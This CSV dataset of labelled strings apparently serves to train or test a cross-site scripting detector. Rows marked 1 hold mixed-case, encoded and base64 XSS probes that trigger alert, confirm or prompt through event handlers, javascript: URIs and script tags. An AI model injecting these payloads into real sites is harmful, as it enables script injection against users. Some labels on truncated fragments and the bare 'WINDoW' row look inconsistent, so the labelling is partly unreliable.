payload,label
Zy<span onmouseover=confirm(1)>Xq,1
<a onfocus=showMenu(,0
<ScrIPT>DOcumEnT.WriTe('<IMG sRc=X OneRroR=alERT(1)>')</SCRipT>,1
<img onmouseover=,0
<svg onLoAD=aLeRT(1)>,1
<span oNClIck=pRoMpT(1)>,1
<A ONCliCk=VaLIDate()>,0
XI<div onclick=confirm(1)>3n4F,1
javASCriPt:CoNfIRM(1),1
<dIv oNfoCUS=AlErT(1)>,1
"<SCriPT>SEtTiMEouT('AlERT(1)',1000)</sCRIPt>",1
<diV OnFocus=vaLiDATe()>,0
xE<svg onmouseover=confirm(1)>2aUtXJ,1
bMyG<div onmouseover=init()>XftXc,0
i6Zk5<svg onmouseover=alert(1)>qQ8l,1
<a onmouseo,0
<sVG oNmouSeOVEr=aLeRT(1)>,1
VOLb<img onclick=prompt(1)>6ErTM,1
<spAN oNFOcUs=PromPT(1)>,1
<svG onLOAD=inIt()>,0
<SPAN oNMoUseOveR=HIGhlIGht()>,0
MDqWf<div onmouseover=highlight()>tAM,0
<imG ONLoad=CoNFiRm(1)>,1
<a onload=validate(),0
"<scRiPT>SEtTIMeoUt('aLERt(1)',1000)</sCRIPT>",1
<iMG oNfoCUs=AleRT(1)>,1
3u7cD<script>document.write('<img src=x onerror=alert(1)>')</script>oFCewk,1
<spAn onFOcuS=HIGHligHT()>,0
8a9z<div onclick=showMenu()>ghI9IO,0
Z0<script>eval('alert(1)')</script>UWg4OF,1
<a ONloAD=CONFIRM(1)>,1
<IMG OncLIck=HIGhLiGHt()>,0
Es<img onload=prompt(1)>NY2kC,1
jAVAsCripT:cOnFIRm(1),1
<Span OnmoUsEOVER=AleRT(1)>,1
sPy6javascript:confirm(1)D4Xrs,1
<Img ONFOcUS=AleRT(1)>,1
xwdo<script>window</script>3b2,1
<DiV onFOCus=HIGHLigHt()>,0
jAvAsCRiPt:vOID(0),0
<iMg ONCLIck=alerT(1)>,1
<svg onclick=showMenu,0
jaVAScRiPt:VOID(0),0
<span onfoCus=pROmpt(1)>,1
L4PcCZ<div onclick=alert(1)>XwMr,1
<iMg OnfOcUS=VAlIdAtE()>,0
Iwu<div onfocus=showMenu()>CBq8,0
<sCrIpT>DoCUMeNt.WRITe('<ImG sRc=x onERROr=Alert(1)>')</SCrIPT>,1
jAVaScRipT:prompt(1),1
7X<img onmouseover=highlight()>Pjonbw,0
<svG onMOUSeOveR=shOWMenU()>,0
<sPan oNclIcK=HIGHlighT()>,0
hexb<div onfocus=alert(1)>4Z0MOR,1
<SPaN oNFOCuS=CoNfIRm(1)>,1
<sCRIPT>DOcuMENT.WriTe('<IMG src=X ONerRor=Alert(1)>')</SCrIpt>,1
<SPan oNMoUSeoveR=inIt()>,0
<Svg oNClIcK=confIrM(1)>,1
<Div onLOaD=CONfiRm(1)>,1
<iMg OnFOcUS=Alert(1)>,1
<dIV oNLoaD=proMPT(1)>,1
<div onmouseover=n,0
JaVAsCRipT:voId(0),0
<ImG OnmoUSeover=PrOMPt(1)>,1
<IMG onFoCus=SHowMENu()>,0
<ImG ONmOuSeoVer=ALeRT(1)>,1
Lr4<div onmouseover=prompt(1)>Wc9,1
JaVAsCript:ALERt(1),1
<SvG onMOusEover=ALert(1)>,1
rtzz4u<svg onmouseover=alert(1)>HXaAhh,1
rU8Gjavascript:alert(1)end0,1
ke4RO<script>eval('alert(1)')</script>Ux5,1
jAVascriPt:VOID(0),0
R4x<span onclick=init()>W6,0
<A OnLOad=VAlIDaTe()>,0
yU1N<span onmouseover=validate()>u6ji,0
<SVG onmOuSEovEr=coNfIrM(1)>,1
<DIV ONClIcK=ALERt(1)>,1
QY<div onmouseover=confirm(1)>DB,1
qdqQ2javascript:confirm(1)VJQ,1
<div onmouseover=pr,1
g3itF<span onmouseover=prompt(1)>u867J,1
<span onFOcUS=alert(1)>,1
<iMG onmOusEOVeR=valIDate()>,0
<ImG oNmOUSeOver=sHOwMeNu()>,0
"<scrIpT>seTTIMeoUT('alERt(1)',1000)</sCRIPt>",1
<sVg onfoCUS=IniT()>,0
<a oNcliCK=PROMpt(1)>,1
jAVAScRIpt:CONFirm(1),1
<img onload=vali,0
jaVascrIpT:coNfIRM(1),1
xvYq<div onmouseover=highlight()>ad,0
jAvAsCript:ALeRT(1),1
<SpAN ONLoad=HIGHLIgHt()>,0
Nsz<img onclick=showMenu()>zO04B,0
<ScRipT>DOcUMeNt.wrITE('<iMG sRC=X oneRRor=AlErt(1)>')</SCRIpt>,1
<DIV onCLIck=ConFIrM(1)>,1
<svg onMOUsEoVer=NoOP()>,0
<A OnloAD=CONfiRM(1)>,1
<iMG OnLOad=HighLIGht()>,0
jaVaScRIpt:vOiD(0),0
<ScRIpt>DOCUmEnT.wrItE('<IMG src=X oNERROr=ALert(1)>')</sCRipt>,1
<Svg OnMouSeOvEr=prOmpt(1)>,1
<a oNfoCus=cONFirM(1)>,1
<iMg oncLIck=AlERt(1)>,1
tM<div onfocus=alert(1)>q0dF,1
<span onFoCUS=ALErt(1)>,1
oIf<span onclick=showMenu()>Odd,0
<SVg oNfoCUS=pROmPT(1)>,1
JaVaSCripT:conFirM(1),1
FcrFW9<a onload=highlight()>90,0
<sCrIPT>EVal('aLErT(1)')</sCRipT>,1
gqhp<a onmouseover=alert(1)>vgX1,1
<Img ONfoCUs=init()>,0
<a OnMouSEOVEr=nOOp()>,0
<sPAN oNclICK=SHOWMENU()>,0
5QDn<img onmouseover=showMenu()>Pnb4E8,0
<SCriPT>WiNDoW</ScRIpt>,1
<span onfocus,0
<dIv onCLICk=alERt(1)>,1
desdv<svg onclick=confirm(1)>hor5EX,1
jAVascriPt:PrOmPt(1),1
Amf8z<a onmouseover=init()>5Y0OQs,0
eg1qKjavascript:confirm(1)x6Ug7w,1
6gjavascript:prompt(1)3Ot4u3,1
<sCrIpt>doCUMent.writE('<img Src=X ONeRRoR=aLeRT(1)>')</scRIpT>,1
<svg onfocus,1
<Svg OnFocuS=AleRt(1)>,1
<sCRipT>docUmEnT.WRIte('<iMg SrC=x oNErRor=ALert(1)>')</sCriPt>,1
<sCRIPT>wiNdOW</ScripT>,1
"<scrIPt>SEtTImeoUt('aleRt(1)',1000)</sCriPT>",1
eNfKwG<script>document.write('<img src=x onerror=alert(1)>')</script>wq,1
"q4KW<script>setTimeout('alert(1)',1000)</script>4r02E",1
jaVAScRIPT:VOid(0),0
<span onmouseove,0
<scRIPT>doCUMEnT.wRITE('<IMg SrC=x ONerroR=AlerT(1)>')</SCRIPT>,1
<A OnloaD=coNfIrM(1)>,1
<SvG ONcLIcK=ALert(1)>,1
HxtFYb<div onload=validate()>EZZa,0
<svg onload=confirm(1,1
TisDki<img onclick=noop()>Zn,0
<iMG OncLiCK=cONfiRm(1)>,1
jaVAScrIPT:coNFiRm(1),1
<sCRIpt>DOcUmeNt.wRIte('<imG sRc=X ONerRor=AlErt(1)>')</sCRIpT>,1
XJ8Yjavascript:alert(1)zVqx,1
RoOz8<script>eval('alert(1)')</script>RFw,1
vUTzj6<div onmouseover=alert(1)>O0A,1
<SCRIpt>EVaL('aLERT(1)')</ScrIpT>,1
%3Cdiv%20onmouseover%3Dconfirm%281%29%3E,1
<SCriPT>DoCuMEnT.WRitE('<IMg src=X oNeRROR=aLERT(1)>')</SCrIPt>,1
oou3<script>eval('alert(1)')</script>akE,1
<sPAn oncLick=nooP()>,0
hMt<svg onclick=prompt(1)>wmPa2K,1
<img onmouseover=prom,1
<ScrIPt>WiNdOw</ScrIpt>,1
<dIV onLoAd=Alert(1)>,1
df<img onload=confirm(1)>oY,1
nLZjjjavascript:confirm(1)Qrf6j,1
<Img ONLoad=Alert(1)>,1
<sCrIpT>eval('ALeRt(1)')</ScRipT>,1
<a ONmoUSEoVer=VAlIdAte()>,0
<SVG onMOusEOver=ConfiRm(1)>,1
<SpAN OnLoAD=ShowMEnu()>,0
<sCRiPT>wiNdow</scrIPt>,1
javaScRipT:PrOmpt(1),1
"<scriPt>SETTImeoUt('aLErt(1)',1000)</scRIpt>",1
Cd<script>eval('alert(1)')</script>JEeMPg,1
8Zb<svg onload=showMenu()>E0Hm,0
<svg ONLoad=INiT()>,0
<spaN ONfOCUs=iNiT()>,0
G7Ari<svg onclick=validate()>J45,0
<a onMOUSeOvER=hIGhLigHT()>,0
<DIV ONCLICk=cONfirm(1)>,1
vd3Rl<img onclick=alert(1)>zabm,1
gwJAcjavascript:void(0)ZxQ5,0
bdDPmjavascript:confirm(1)hRgDY,1
<SVG onmoUSEOveR=nOoP()>,0
GX4Dm<svg onload=noop()>IT,0
ZK<svg onmouseover=prompt(1)>qY4hN,1
oae<script>window</script>D3,1
"&lt;script&gt;setTimeout('alert(1)',1000)&lt;/script&gt;",1
L89mzJ<script>eval('alert(1)')</script>Wu,1
<svg onfocus=showMenu()>,0
<a ONloAd=coNFiRm(1)>,1
%3Cimg%20onclick%3Dinit%28%29%3E,0
jAvaScRipt:Void(0),0
<svG oNmOusEoVER=ALerT(1)>,1
mm82Yo<a onmouseover=confirm(1)>NENDb,1
UvOtjavascript:prompt(1)BWk,1
<DiV OnFoCUs=COnFiRM(1)>,1
<img onfocus=h,0
<sPan oNClick=valiDate()>,0
<DIV OnFOcUS=hiGHligHt()>,0
<a OnLOad=iNIT()>,0
<Img OnfOCuS=ALerT(1)>,1
<iMg onloaD=alErT(1)>,1
<DIv ONfocus=SHoWmeNU()>,0
<a OnmousEOVEr=PrompT(1)>,1
jaVasCRIPt:VOiD(0),0
H5q<svg onfocus=showMenu()>KvF,0
jaVaScRIPt:aLERT(1),1
javaSCRIPT:PRoMPt(1),1
<imG onfocuS=ALErT(1)>,1
<SvG oNClIck=NOOP()>,0
CZ5ZVp<img onmouseover=confirm(1)>0qHOD,1
<SPAn onLoAD=cONFIrm(1)>,1
JAVasCriPt:ConfIRm(1),1
wXXHRQ<span onclick=init()>TD,0
2Cpt<script>document.write('<img src=x onerror=alert(1)>')</script>Wfurn8,1
<div OnlOaD=PROmPT(1)>,1
O1k<div onclick=prompt(1)>G2frj,1
<sCrIpT>docuMent.WRiTE('<Img srC=X OnERROr=ALert(1)>')</SCripT>,1
<imG oNLOAd=noOP()>,0
<img onload=highl,0
<imG onLoaD=promPT(1)>,1
s0sN<a onclick=alert(1)>NlZf,1
rFn4javascript:confirm(1)CXxlss,1
5SPaZ<div onload=alert(1)>FhRk,1
<ScRiPt>eVaL('aLErt(1)')</SCRIPT>,1
"lub2Fd<script>setTimeout('alert(1)',1000)</script>ywOYrV",1
<sPaN onCLick=CoNFiRM(1)>,1
<a onmOuSEoVER=ProMpT(1)>,1
JAVASCRipt:vOID(0),0
%253Cimg%2520src%253Dcat.png%253E,0
<span onclick=confirm(1),1
<A OnMoUsEoVeR=PRoMPt(1)>,1
<a onFoCUS=vaLIdatE()>,0
<iMg onmOUSEoveR=aLERt(1)>,1
<scRiPt>EvAL('ALeRT(1)')</ScrIpT>,1
<sCrIpT>evAL('alerT(1)')</ScRIPT>,1
<scRIPT>winDow</sCRiPT>,1
3E<span onmouseover=prompt(1)>fqK2y,1
<scrIPt>wiNdoW</sCRIpt>,1
etnaBL<img onclick=alert(1)>PmG1eM,1
<SCRipT>DOCuMeNt.WriTe('<iMG sRC=x onERROr=alerT(1)>')</SCriPT>,1
<A oNfoCUS=iNit()>,0
Ay<script>window</script>Y3GE,1
"q4PTSU<script>setTimeout('alert(1)',1000)</script>k23",1
<SCRIPT>eVAl('aLErT(1)')</sCrIpT>,1
"nH<script>setTimeout('alert(1)',1000)</script>xr",1
fUC6<div onclick=highlight()>rD,0
hdiX6<a onclick=alert(1)>MM8jvK,1
JAvaSCrIpT:coNfIRm(1),1
<svg onmouseover=highl,0
<dIV ONMouSEOVEr=cOnFiRm(1)>,1
89sDr<div onmouseover=highlight()>usi,0
<Svg oNLoaD=promPt(1)>,1
<Img ONfOCus=SHOWmeNU()>,0
<sVg oNfoCUS=NOOP()>,0
do9ND<img onclick=alert(1)>9ELg,1
d0eR3l<img onmouseover=showMenu()>h0tqK,0
<sPAN OnMousEOVER=vAlIdAtE()>,0
4b<div onmouseover=alert(1)>oQ,1
javASCRipt:AleRT(1),1
<scRIPt>Eval('ALErT(1)')</ScrIpT>,1
b36<a onfocus=alert(1)>bk7,1
<SPAN ONfoCUS=HIGHlighT()>,0
<SVg onmoUSEOVER=sHoWMENu()>,0
&lt;img onmouseover=noop()&gt;,0
&lt;img onmouseover=showMenu()&gt;,0
WINDoW,1
Yj<a onload=validate()>TQ0,0
<img onLOad=coNFiRm(1)>,1
tfitcC<svg onload=validate()>Bccm,0
JavasCrIPt:PromPt(1),1
JAVAscripT:ALert(1),1
JaVascripT:vOId(0),0
3nQYL<div onmouseover=noop()>RuU,0
33xnPP<a onload=alert(1)>V2,1
<ScripT>dOCUmenT.WRiTE('<IMG sRC=X onerroR=aLerT(1)>')</SCRiPt>,1
bVjavascript:prompt(1)EesC,1
<sVG OnLOAD=CONfirM(1)>,1
jY<div onfocus=init()>V6SH,0
QoWRln<script>document.write('<img src=x onerror=alert(1)>')</script>fNn,1
jAVaSCrIpt:confIrm(1),1
JAvasCrIPt:vOId(0),0
<IMG OnMoUsEoVEr=PRomPT(1)>,1
JAvaScRIpt:COnFIRM(1),1
<SVG oNmOUSEoVER=aLERt(1)>,1
<DIv OnlOAd=NOop()>,0
<SVG oNLOAD=CONfiRm(1)>,1
<SvG OnFOcus=ALERT(1)>,1
<Span ONclICK=ProMPt(1)>,1
<img onclick=ale,1
<a oNMOuSeoVer=shOWMENu()>,0
<A OncliCk=hIGhliGHt()>,0
<div onmouseover=highlight()>,0
%253Cspan%2520onfocus%253Dprompt%25281%2529%253E,1
<IMG ONFoCus=CoNfIrm(1)>,1
<A onfocuS=ShOWMEnU()>,0
VdzZg<script>document.write('<img src=x onerror=alert(1)>')</script>hY,1
<SvG onclICk=alErt(1)>,1
<diV ONClicK=nOoP()>,0
<IMG ONclick=conFirM(1)>,1
eT<span onmouseover=init()>fA,0
JAVAsCRiPT:VoID(0),0
JAvascrIpt:VoiD(0),0
<ImG ONLOad=iniT()>,0
"<iframe src=data:text/html;base64,PHNjcmlw",1
%253Csvg%2520onfocus%253DshowMenu%2528%2529%253E,0
jAVaScript:AlERt(1),1
<sVg onFoCus=proMpT(1)>,1
<SCRIPT>winDOw</scrIpt>,1
<Script>EvAl('ALErT(1)')</sCrIpt>,1
v0<span onload=prompt(1)>sc,1
javascript:confirm(1),1
JAVaSCRIpT:VOid(0),0
<Svg OnLOAd=vALIdaTE()>,0
<a onload=coNfiRM(1)>,1
<ScRIPT>EvAl('AleRT(1)')</scrIpT>,1
Zofjavascript:void(0)t9s7V,0
<A oNMOUseOVeR=CONfiRM(1)>,1
<SPAn OnMoUseoVer=vAlIDate()>,0
jAvAsCRipT:prOMpT(1),1
4RCOyv<div onfocus=highlight()>0O,0
<SvG OnmOUSEoveR=alErt(1)>,1
<Div onLoad=VaLIdAte()>,0
<dIV oNfOCus=PROMPt(1)>,1
5Frh<script>document.write('<img src=x onerror=alert(1)>')</script>yMsQG,1
<IMg ONmoUSEOvEr=sHowMENU()>,0
<IMg oNLoAd=ConFIRm(1)>,1
<DIV onfoCUs=confIRm(1)>,1
u6D<a onload=init()>ff,0
<spAn ONclicK=CoNFiRM(1)>,1
<Svg oNCLIcK=pRomPt(1)>,1
<svG OnFoCUs=NOoP()>,0
Xlk<span onmouseover=showMenu()>KeJemq,0
7qGa<script>document.write('<img src=x onerror=alert(1)>')</script>sop9,1
<Img oNcLicK=ValidAtE()>,0
<A ONMOUseovEr=proMPt(1)>,1
<DiV onClick=showmEnu()>,0
<sCript>DOcuMENt.WRite('<ImG SrC=x onerroR=AlERT(1)>')</SCrIPt>,1
JAVAScrIpt:PRoMPt(1),1
<a href=javascript:void(0)>,0
JaVaSCrIpt:voiD(0),0
BmICwjavascript:prompt(1)FPSw,1
FPDVO<a onmouseover=confirm(1)>Fb,1
Yd<script>document.write('<img src=x onerror=alert(1)>')</script>BE,1
<Svg onLoAD=Init()>,0
V2vjavascript:void(0)Cu7Rd,0
<SPAN OnClICk=pRompT(1)>,1
<sVg onFoCuS=vAlidate()>,0
jAVaScRiPt:prompt(1),1
"1hD3C2<script>setTimeout('alert(1)',1000)</script>vNQxz",1
jAVAscript:CONFiRM(1),1
<A onmouSeOVEr=cONFIRm(1)>,1
<ScRIpT>EVAl('aleRT(1)')</scRiPt>,1
q61javascript:void(0)7BDb,0
<svg ONLOaD=PROmPT(1)>,1
JaVASCrIpT:voiD(0),0
DJuFKljavascript:void(0)Fdwe,0
<dIv ONlOaD=CoNFirM(1)>,1
1cRnQ<script>window</script>19Zpc,1
<img src='vbscript:msgbox(1)'>,1
2XXijavascript:confirm(1)mcRnxe,1
YP6Wsjavascript:void(0)XhaSRZ,0
U0<img onfocus=confirm(1)>iq,1
<sVG OncliCK=cONFIRM(1)>,1
BTo4i<a onmouseover=confirm(1)>YNLyR,1
<SVG OnMoUSeovEr=sHOWMEnu()>,0
csZN<script>eval('alert(1)')</script>xJ0reM,1
<ScriPT>wInDOW</SCript>,1
XWRmRjavascript:confirm(1)2XC,1
<A ONclICK=AleRt(1)>,1
<SVG onFoCUs=pRomPt(1)>,1
444Sn<script>window</script>E5AL,1
"tEe5<script>setTimeout('alert(1)',1000)</script>Xxxo",1
1ljavascript:void(0)8ZD,0
<a ONfOCuS=vAliDATE()>,0
jyKyN0<img onfocus=prompt(1)>zVVki,1
<a onfOCUS=valiDATE()>,0
<DIV OnmOUsEover=AleRT(1)>,1
<a ONFocus=SHoWmeNU()>,0
<sPan oNfOcUs=HIGHLighT()>,0
jAvAscrIpt:void(0),0
x7VF<svg onfocus=highlight()>qF,0
<sCRIpT>WInDOw</SCriPT>,1
"keqp6<script>setTimeout('alert(1)',1000)</script>yRBTv3",1
u91<svg onload=validate()>bBmGu,0
3FeFa<script>window</script>9p,1
<Img oNmoUSeOver=ALeRT(1)>,1
<SPAN OnFOcus=init()>,0
Dm<div onfocus=init()>pX3Ku1,0
<Span oNLOad=INiT()>,0
<SVg ONLOaD=Init()>,0
<img onfOcus=ALerT(1)>,1
jaVAScripT:PROMpT(1),1
<SVG OnfoCus=vAlidAte()>,0
DU7H<img onfocus=alert(1)>iLOM6z,1
<svg OnmOUsEOvER=Init()>,0
JaVASCRIPt:vOid(0),0
<img onlOad=init()>,0
<SVG oNmOuseOver=vALIDATE()>,0
<SCripT>wINDOW</scRipt>,1
Wh<span onmouseover=highlight()>8RwS3x,0
s5G9<div onload=showMenu()>mHkxw2,0
<a OnloaD=valIDaTe()>,0
W9Pv<img onclick=highlight()>MjUE,0
"<SCrIPT>settIMeouT('alert(1)',1000)</SCrIPt>",1
0H<img onfocus=highlight()>Fye9,0
jaVaSCRiPT:vOID(0),0
<a OnmoUSeoVeR=aLERt(1)>,1
<img onmoUSeovER=nOOp()>,0
Iujfr<script>document.write('<img src=x onerror=alert(1)>')</script>Nts,1
<scRipt>DoCUMenT.WritE('<img src=X ONErroR=alERt(1)>')</SCrIpT>,1
edm<span onmouseover=confirm(1)>zo,1
6XG<svg onload=alert(1)>YOCg,1
<sCrIPT>WiNdow</scRIPt>,1
<SVG onLoaD=AleRT(1)>,1
JAVAsCRiPt:CONfiRM(1),1
iM0<a onload=validate()>2ALz,0
jaVASCRipT:aLeRT(1),1
Vf14<span onclick=showMenu()>70,0
QF<svg onfocus=confirm(1)>WiwS,1
D5NvR<script>window</script>BLOb,1
jAvaSCriPT:alerT(1),1
<DiV ONFocuS=NOoP()>,0
<DiV onClICk=PromPT(1)>,1
DRecHe<span onmouseover=showMenu()>IY,0
%3Cmeta%20http-equiv%3D%22refresh%22%20content%3D%220%3Burl%3Ddata%3Atext/html%3Bbase64%2CPHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg%3D%3D%22%3E,1
E5s<div onfocus=confirm(1)>iyIt3,1
Y4HI<div onfocus=prompt(1)>EJrw,1
<a OnclICK=ALeRT(1)>,1
<DiV ONClick=conFirm(1)>,1
JAvaScRIpt:CoNfIrM(1),1
ps<script>window</script>FR,1
V0HkH2javascript:void(0)N2LUGk,0
<sPaN ONfoCUs=shoWMEnU()>,0
<A oNfoCUs=PRoMPt(1)>,1
<script>document.write('<img src=x on,1
<img ONMoUSeoVer=COnFiRm(1)>,1
JavASCRipt:VoId(0),0
<svG OnmoUseOVEr=conFIrM(1)>,1
<SPAN ONClICk=ConFiRm(1)>,1
<svG onMOUSEOVER=hIghLigHT()>,0
Gi8<script>eval('alert(1)')</script>7Z5,1
%253Cdiv%2520onmouseover%253Dnoop%2528%2529%253E,0
<img onclick=validate,0
<sVG OnlOad=cONfIRm(1)>,1
zbsb1javascript:alert(1)X26,1
<scripT>wIndow</ScriPt>,1
<DIV onloAd=alErt(1)>,1
<SPAN ONcLick=init()>,0
lDujavascript:prompt(1)Hk,1
<Div OnFoCUS=SHOwmENU()>,0
<IMG oNloAd=pROmPT(1)>,1
ky9Q<div onload=prompt(1)>1bti,1
DcM4C<svg onload=alert(1)>lOw,1
<DIV ONfocuS=nOop()>,0
<A oNCLIcK=pRomPT(1)>,1
<ScRiPt>EVaL('alErt(1)')</sCrIPt>,1
hI0bdKjavascript:void(0)p6,0
JaVAScRiPT:aLert(1),1
z2<img onfocus=confirm(1)>kMmkT,1
<ScRiPT>EVAl('AlERt(1)')</scRIPt>,1
HN7bF<div onload=prompt(1)>r9,1
<script>window<,1
<sPAn onmouseovEr=cOnfIRm(1)>,1
fBjavascript:void(0)UqRm,0
<A OnfOCus=AlErt(1)>,1
jaVAScRiPT:VOid(0),0
IVMTjavascript:alert(1)54XPH7,1
<iMg oNCLIck=conFIrm(1)>,1
<div onclick=confirm(1),1
"<sCrIpt>sETtiMEout('aLERT(1)',1000)</sCriPt>",1
<a OnFocUs=valIdAtE()>,0
zqW<a onload=confirm(1)>z6tL,1
<DIv onMoUsEoveR=PrOMPT(1)>,1
<A onClick=PROMPt(1)>,1
RC<span onload=alert(1)>bIeN,1
<dIV OnmOUSEovER=prompT(1)>,1
<span oNMoUseOVeR=NoOp()>,0
ZaH<svg onfocus=prompt(1)>4b,1
<dIv oNfocUs=cOnFiRM(1)>,1
<A onmOuSEOveR=proMPT(1)>,1
JaVasCRIPT:alERT(1),1
8rd<svg onclick=highlight()>cbPhy,0
KSAVmT<a onload=noop()>LLPz,0
<a onclick=al,1
rSIc6O<script>eval('alert(1)')</script>s4u1,1
"<scRIpt>setTiMeOUT('alERT(1)',1000)</ScriPT>",1
<Div oNfOcus=CONFIrM(1)>,1
<spaN OnMouSeOvER=iNit()>,0
HOc<svg onclick=init()>OUju8l,0
<scrIPt>dOcUmEnt.wRITE('<IMg Src=X ONErRoR=AlERt(1)>')</ScrIPt>,1
pUnVQ<span onmouseover=highlight()>B6qO,0
<A ONFOcUS=highlIght()>,0
"<scrIPt>SEttimeOUt('alerT(1)',1000)</scriPT>",1
<dIv OnmOuSeOVer=vALIDAtE()>,0
IMXHn<script>eval('alert(1)')</script>LUAm,1
<A oNloAD=CoNFiRm(1)>,1
E7H9ghjavascript:confirm(1)bLwjU,1
"LHm<script>setTimeout('alert(1)',1000)</script>PedQj",1
zYa<div onfocus=alert(1)>9M,1
<img oNLoAd=AleRT(1)>,1
dbu<img onfocus=highlight()>OS2k,0
<A oNMousEovER=Alert(1)>,1
JavaSCRiPT:ALERt(1),1
<spAn Onload=Prompt(1)>,1
<svG OnmoUsEoVEr=ALERT(1)>,1
JaVascRIPt:COnfirm(1),1
<Svg OnFocuS=PrOMPt(1)>,1
oHkFy<span onload=noop()>1lqxmZ,0
<img onclick=s,0
yBe4javascript:prompt(1)HI,1
<sCriPt>DOcUmeNT.WRiTe('<img SRc=X OnERROr=ALErt(1)>')</SCRiPt>,1
<A onfOCus=NOOP()>,0
aR<img onclick=confirm(1)>fghEiR,1
jAvaScriPT:vOID(0),0
<DiV OnFOcus=showmEnU()>,0
CXt<img onload=prompt(1)>zOJSK,1
<spAN onclICK=CONFIRM(1)>,1
%253C/body%253E,0
<ImG ONCliCk=noOP()>,0
Dj<span onload=noop()>d4VVwW,0
<SpAn oNCLIck=alert(1)>,1
zF<div onmouseover=confirm(1)>C3W9IX,1
jAVaScRIpt:voId(0),0
q6iw<svg onload=init()>ZM9,0
uYjavascript:void(0)JNhG,0
<DIV onFOCuS=pRompt(1)>,1
<svg OnclICK=IniT()>,0
<A oNmOUseOvER=INiT()>,0
<Svg onFoCus=SHOwmENu()>,0
SEb3q<a onmouseover=validate()>PTQ,0
<IMG oNfOCUS=aleRt(1)>,1
<span onfocus=confi,1
Q1j<span onload=prompt(1)>Fo7,1
"0dj<script>setTimeout('alert(1)',1000)</script>9ixrnB",1
<Span OnLOAd=AlERt(1)>,1
<sPaN onMOUSeoveR=shOwmeNu()>,0
sAWjavascript:void(0)Khdn,0
YLjavascript:void(0)jcbkZ,0
OY2DND<script>document.write('<img src=x onerror=alert(1)>')</script>ulTj,1
<Span OnFOcUs=aLERt(1)>,1
<diV ONclicK=INIt()>,0
<scRIpT>EVAl('alerT(1)')</Script>,1
PsNc<a onclick=validate()>k5r4,0
<SCriPt>wIndow</SCripT>,1
"<sCrIPt>sEttImeoUt('aLErt(1)',1000)</sCRiPt>",1
<SVg onClIck=aLeRT(1)>,1
<A oncliCK=NooP()>,0
4z<img onfocus=prompt(1)>5C,1
<sCRIPT>evAl('ALErT(1)')</scRiPT>,1
<SpAn oNLoAd=hiGhliGHT()>,0
<A OnMoUseOvER=CONfIrm(1)>,1
r1MF6o<script>eval('alert(1)')</script>RRoiQZ,1
<dIv ONCliCk=PrOmpt(1)>,1
JAvaScRipT:void(0),0
<Img OnmoUSeoVER=shOwmeNu()>,0
tQJ<div onmouseover=init()>ujT53,0
"uhz<script>setTimeout('alert(1)',1000)</script>eq",1
"<ScRiPt>SETtiMeOUt('aleRT(1)',1000)</scrIpT>",1
<ScRIPt>eVAl('AleRt(1)')</sCRiPT>,1
JavascriPT:aLeRT(1),1
JavAsCriPT:conFiRm(1),1
<A OnfOcuS=proMpT(1)>,1
<ScRipt>doCumEnt.wrItE('<iMG SRc=x onerROR=aleRT(1)>')</SCriPt>,1
xb<span onmouseover=prompt(1)>RE7j7s,1
<spAN oNloaD=VALIdaTe()>,0
<iMg oNfocus=PRompt(1)>,1
<IMg oNcLIcK=shoWMEnu()>,0
8Bieb<span onmouseover=highlight()>LqG,0
<SpAN onFocUS=cONFIRm(1)>,1
bu<svg onmouseover=alert(1)>qIJ,1
<svg ONclick=coNfirm(1)>,1
tVr<a onmouseover=noop()>a1Dt,0
"ZzAKXF<script>setTimeout('alert(1)',1000)</script>5HJVr",1
MIzrjavascript:void(0)Fsh3a,0
<ImG ONLOAd=INiT()>,0
<Img ONLoAd=NOOP()>,0
6K<div onmouseover=prompt(1)>ZcAmZ,1
jAvASCript:cOnFIrm(1),1
"<sCRIpt>SETTiMEouT('aLeRt(1)',1000)</ScRIpt>",1
<A OnCLICk=ALerT(1)>,1
sRD<span onfocus=highlight()>hN,0
<img ONmOusEoVeR=PRomPt(1)>,1
jAvAsCRiPt:CONFIrm(1),1
cbjavascript:alert(1)W1TokM,1
<SCRIpt>EvAl('ALert(1)')</scriPT>,1
RGWy1<img onmouseover=validate()>McN,0
<Span ONcLICk=alert(1)>,1
<Img ONCliCK=pRoMpT(1)>,1
<SVg onFOcus=PrOMpt(1)>,1
FNowPjavascript:void(0)7X,0
u2haJN<a onmouseover=validate()>AT,0
V5GDrO<a onmouseover=init()>WDQ,0
<svg onCLiCK=alErT(1)>,1
JAvaScrIPt:CONFiRm(1),1
HBb58javascript:confirm(1)US,1
JaVaSCRIPT:AlERT(1),1
<SpAN oNlOAd=showmeNU()>,0
<SVG oNmoUSEoveR=SHOwMEnu()>,0
